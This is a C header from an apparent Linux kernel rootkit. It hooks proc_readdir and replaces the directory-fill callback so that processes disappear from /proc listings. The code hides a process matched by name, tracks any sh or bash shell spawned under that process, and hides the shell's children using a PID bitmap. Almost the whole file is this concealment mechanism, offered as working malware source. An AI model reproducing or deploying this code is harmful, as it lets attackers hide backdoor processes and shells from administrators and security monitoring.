#ifndef PROC_ID_H
#define PROC_ID_H

#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/version.h>
#include <linux/proc_fs.h>
#if LINUX_VERSION_CODE >= KERNEL_VERSION(3, 10, 0)
#include <linux/pid_namespace.h>
#endif
#include <linux/init.h>
#include <linux/string.h>
#include <linux/types.h>
#include <linux/fs.h>
#include <linux/file.h>
#include <linux/dirent.h>
#include <linux/sched.h>
#if LINUX_VERSION_CODE >= KERNEL_VERSION(2, 6, 25)
#include <linux/pid.h>
#endif
#include <asm/uaccess.h>
#include <linux/slab.h>
#include <linux/mman.h>

#include "config.h"

extern hook_t _tbl[];


#if LINUX_VERSION_CODE > KERNEL_VERSION(3,10,0)
static int (*ptr_filldir)(struct dir_context *, const char *, int, loff_t, u64, unsigned);
#elif LINUX_VERSION_CODE >= KERNEL_VERSION(2, 6, 8)
static int (*ptr_filldir)(void *__buf, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type);
#endif

#if LINUX_VERSION_CODE > KERNEL_VERSION(3,10,0)
int __proc_readdir(struct file *file, struct dir_context *ctx);
#elif  LINUX_VERSION_CODE >= KERNEL_VERSION(2,6,8)
int __proc_readdir( struct file *file, void *dirent, filldir_t filldir );
#endif


#define MAX_PIDS 0x9000

char pids[MAX_PIDS / 8 + 1];

static inline void pid_hide(long x)
{
	// bug is_pid
	if (x >= MAX_PIDS)
		return;

	pids[x / 8] |= 1 << (x % 8);
}

static inline void pid_unhide(long x)
{
	if (x >= MAX_PIDS)
		return;

	pids[x / 8] &= ~(1 << (x % 8));
}

static inline char is_pid(long x)
{
	if (x >= MAX_PIDS)
		return 0;

	return pids[x / 8] & (1 << (x % 8));
}

//-----------------------------------------------------------------------------

#if LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 28)
#define get_task_uid(task) task->uid
#define get_task_parent(task) task->parent
#else
#define get_task_uid(task) task->cred->uid
#define get_task_parent(task) task->real_parent
#endif

static long _root = 0;
static long _sh = 0;
#if LINUX_VERSION_CODE > KERNEL_VERSION(3,10,0)
static int n_filldir( struct dir_context *nrf_ctx, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type )
#elif LINUX_VERSION_CODE >= KERNEL_VERSION(2, 6, 8)
static int n_filldir(void *__buf, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type)
#endif
{
	char *endp;
	long pid;
	struct task_struct *_task;
	struct task_struct *tsk_parent;

	pid = simple_strtol(name, &endp, 10);
	if (pid >= 3)
	{
		rcu_read_lock();
#if LINUX_VERSION_CODE >= KERNEL_VERSION(3,10,0)
		_task = pid_task(find_pid_ns(pid, task_active_pid_ns(current)), PIDTYPE_PID);
#elif LINUX_VERSION_CODE >= KERNEL_VERSION(2, 6, 25)
		_task = pid_task(find_vpid(pid), PIDTYPE_PID);
#elif LINUX_VERSION_CODE >= KERNEL_VERSION(2, 6, 8)
		_task = find_task_by_pid(pid);
#endif
		rcu_read_unlock();

		if (_task != NULL)
		{
			tsk_parent = get_task_parent(_task);
			if (tsk_parent != NULL && tsk_parent->pid != 1 && tsk_parent->pid == _root && _root != 0)
			{
				debug(" 1. pid %ld  ppid %ld\n", (long)_task->pid, (long)tsk_parent->pid);

				if (strstr(_task->comm, "sh") != NULL || strstr(_task->comm, "bash") != NULL)
				{
					debug("sh pid %ld  ppid %ld\n", (long)_task->pid, (long)tsk_parent->pid);
					_sh = _task->pid;
				}

				return 0;
			}

			if (tsk_parent != NULL && tsk_parent->pid != 1 && tsk_parent->pid == _sh && _sh != 0)
			{
				debug(" 2. pid %ld  ppid %ld\n", (long)_task->pid, (long)tsk_parent->pid);
				pid_hide(pid);

				return 0;
			}

#if LINUX_VERSION_CODE >= KERNEL_VERSION(2, 6, 8)
			if (strstr(_task->comm, _kname) != NULL)
#endif
			{
				// set pid
				_root = pid;

				pid_unhide(pid);
				pid_hide(pid);

				debug(" 0. %ld  name:%s \n", pid, _task->comm);
				return 0;
			}
			
			if (is_pid(pid))
			{
				return 0;
			}

		}
	}

#if LINUX_VERSION_CODE > KERNEL_VERSION(3,10,0)
	return ptr_filldir(nrf_ctx, name, namelen, offset, ino, d_type);
#elif LINUX_VERSION_CODE >= KERNEL_VERSION(2, 6, 8)
	return ptr_filldir(__buf, name, namelen, offset, ino, d_type);
#endif
}

#if LINUX_VERSION_CODE > KERNEL_VERSION(3, 10, 0)
int __proc_readdir(struct file *file, struct dir_context *ctx)
{
	int ret;
	hook_t *hk = NULL;
	int proc_readdir(struct file * file, struct dir_context * ctx);

	ptr_filldir = ctx->actor;

	*((filldir_t *)&ctx->actor) = &n_filldir;

	hk = &_tbl[1];

	ret = ((typeof(proc_readdir) *)hk->stub_bak)(file, ctx);

	return ret;
}
#elif LINUX_VERSION_CODE >= KERNEL_VERSION(2, 6, 8)
int __proc_readdir(struct file *filp, void *dirent, filldir_t filldir)
{
	int result;
	hook_t *hk = NULL;
	int proc_readdir(struct file * file, void *dirent, filldir_t filldir);

	ptr_filldir = filldir;

	hk = &_tbl[1];

	result = ((typeof(proc_readdir) *)hk->stub_bak)(filp, dirent, n_filldir);

	return result;
}

#endif





#endif
